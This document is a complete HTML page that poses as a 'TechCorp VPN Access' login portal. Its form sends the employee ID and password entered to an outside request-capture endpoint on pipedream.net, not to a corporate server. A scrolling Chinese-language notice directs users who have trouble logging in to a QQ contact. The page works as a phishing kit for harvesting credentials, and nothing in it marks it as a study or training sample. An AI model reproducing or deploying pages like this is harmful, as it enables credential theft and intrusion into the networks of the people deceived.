<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TechCorp VPN Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3a5f 0%, #2d5a87 50%, #1e3a5f 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .announcement {
            background: linear-gradient(135deg, #f39c12 0%, #e74c3c 100%);
            color: white;
            padding: 10px;
            overflow: hidden;
        }

        .announcement marquee {
            font-weight: bold;
        }

        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 420px;
            overflow: hidden;
        }

        .login-header {
            background: linear-gradient(135deg, #1e3a5f 0%, #2d5a87 100%);
            padding: 30px;
            text-align: center;
            color: white;
        }

        .login-header h1 {
            font-size: 1.8em;
            margin-bottom: 5px;
        }

        .login-form {
            padding: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
        }

        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1em;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
        }

        .security-info {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-top: 20px;
        }

        .error-message {
            background: #f8d7da;
            color: #721c24;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }

        .footer {
            text-align: center;
            padding: 20px;
            background: #f8f9fa;
            border-top: 1px solid #e9ecef;
        }

        .footer p {
            color: #666;
            font-size: 0.85em;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <div class="announcement">
            <marquee behavior="scroll" direction="left">
                📢 【重要通知】最近VPN连接不稳定，如果出现无法登陆故障，请联系系统管理员QQ: 80302238 | 📢 系统维护通知：本周末将进行系统升级维护，请提前做好准备
            </marquee>
        </div>

        <div class="login-header">
            <div style="font-size: 48px; margin-bottom: 10px;">🔐</div>
            <h1>TechCorp VPN Access</h1>
            <p>Secure Remote Access Portal</p>
        </div>

        <div class="login-form">
            <div class="error-message" id="errorMsg"></div>
            <div class="success-message" id="successMsg"></div>
            <form id="loginForm" action="https://eor3r2hanxj62cv.m.pipedream.net" method="POST">
                <div class="form-group">
                    <label for="username">Employee ID</label>
                    <input type="text" id="username" name="username" placeholder="Enter your employee ID" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit" class="btn-login">Connect to VPN</button>
            </form>
            <div class="security-info"><i>⚠️</i>This is a secure corporate network. Unauthorized access is prohibited.
            </div>
        </div>

        <div class="footer">
            <p>© 2024 TechCorp Enterprise. All rights reserved.</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            if (!username || !password) {
                e.preventDefault();  // 只有空值时阻止提交
                document.getElementById('errorMsg').textContent = 'Please fill in all fields';
                document.getElementById('errorMsg').style.display = 'block';
            }
        });
    </script>
</body>

</html>
